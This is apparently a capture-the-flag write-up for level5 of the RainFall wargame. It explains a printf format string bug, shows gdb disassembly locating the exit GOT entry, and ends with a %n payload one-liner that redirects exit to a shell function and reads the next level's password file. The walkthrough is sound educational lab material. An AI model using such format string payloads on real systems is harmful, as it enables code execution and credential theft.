### Brief
In this program there is a `main`, `n` and `o` function
`main` only call n.
`n` has a stack buffer of `520`, fill it with `fgets`, use `printf` on the buffer and `exit`.
`o` is a function that open a new shell.

### Exploit
We will the same exploit as before and use printf to overwrite the value at a certain address.
We see that the `exit` function is called right after `printf`
We can disas `exit` and we see that it dereference a pointer and call the function located in this address.
We will use `printf` to rewrite the address called by the `exit` function

```bash
level5@RainFall:~$ gdb level5 
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   ...
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```

`exit` call the function located at address `0x8049838` and we can rewrite what this address contains.

Our input is located 4th in the stack.
```bash
level5@RainFall:~$ python -c "print('\xef\xbe\xad\xde|' + '%x '*5)" | ./level5
ﾭ�|200 b7fd1ac0 b7ff37d0 deadbeef 2078257c
```

### Get access

```bash
(python -c "print('\x38\x98\x04\x08' + '%x'*2 + '%134513813x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
```